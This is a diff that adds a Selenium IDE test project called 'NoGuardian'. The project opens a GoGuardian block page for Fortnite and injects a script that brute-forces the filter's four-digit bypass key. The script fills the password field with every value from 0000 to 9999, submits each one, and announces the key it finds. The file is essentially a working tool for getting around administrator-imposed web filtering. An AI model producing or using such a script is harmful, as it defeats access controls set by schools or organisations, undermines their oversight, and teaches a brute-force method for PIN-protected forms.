@@ -1,0 +1,49 @@
+{
+  "id": "e9b40db5-1572-4666-8160-8eaf62d139d6",
+  "version": "3.0",
+  "name": "NoGuardian",
+  "url": "http://www.google.com",
+  "urls": [
+    "http://www.google.com"
+  ],
+  "plugins": [],
+  "suites": [
+    {
+      "id": "518340aa-2be5-45ad-9b56-e2ad33783edd",
+      "name": "New Suite",
+      "parallel": false,
+      "persistSession": false,
+      "tests": [
+        "d700f304-3525-4031-8928-a3a7c97aab88"
+      ],
+      "timeout": 30000
+    }
+  ],
+  "tests": [
+    {
+      "id": "d700f304-3525-4031-8928-a3a7c97aab88",
+      "name": "New Test",
+      "commands": [
+        {
+          "id": "c32df83f-3b9d-47dc-85ee-8b87f6f627e1",
+          "command": "open",
+          "target": "https://blocked.goguardian.com/?ctx=YWZpPTEzNTYyMzAmYXBpPTg2MTYyJm9pPTI3NjcwMzUwMTcxJm91PWh0dHBzJTNBJTJGJTJGd3d3LmVwaWNnYW1lcy5jb20lMkZmb3J0bml0ZSUyRmVuLVVTJTJGaG9tZSZycz1BRE1JTl9TSVRFX0NBVEVHT1JZX0ZJTFRFUiZzY2k9MyZzdD1jaHJvbWl1bS1tJnY9MQ%3D%3D&sum=4103d7d2",
+          "value": ""
+        },
+        {
+          "command": "executeScript",
+          "target": "(function () {   let i = 0;   alert(     `NoGuardian Password Cracker || tb-1.2\\nSTARTING INDEX: ${i}\\nPOSSIBLE COMBINATIONS: 10,000\\nESTIMATED TIME: 1 minute\\nINPUT VALUE: ${       document.querySelector(\"input[type='password']\").value     }\\nBUTTON VALUE: ${document.querySelector(\"button\").value}`   );   function submitNumber() {     if (i === 9999) {       alert(\"NoGuardian Password Cracker could not find the bypass key.\");     }     let num = (\"000\" + i).slice(-4);     console.log(num);     document.querySelector(\"input[type='password']\").value = num;     document.querySelector(\"button\").click();     i++;     setTimeout(submitNumber, 1);   }   submitNumber();   window.onbeforeunload = function () {     document.body.innerHTML = `<p>Bypass key found! (${i})\\nIf it doesn't work, try combinations numerically close to this number.</p>`;     event.preventDefault();   }; })();",
+          "value": "",
+          "id": "1902697f-4816-4aea-8727-c75ab1c85fb8"
+        }
+      ]
+    }
+  ],
+  "snapshot": {
+    "dependencies": {},
+    "tests": [],
+    "jest": {
+      "extraGlobals": []
+    }
+  }
+}
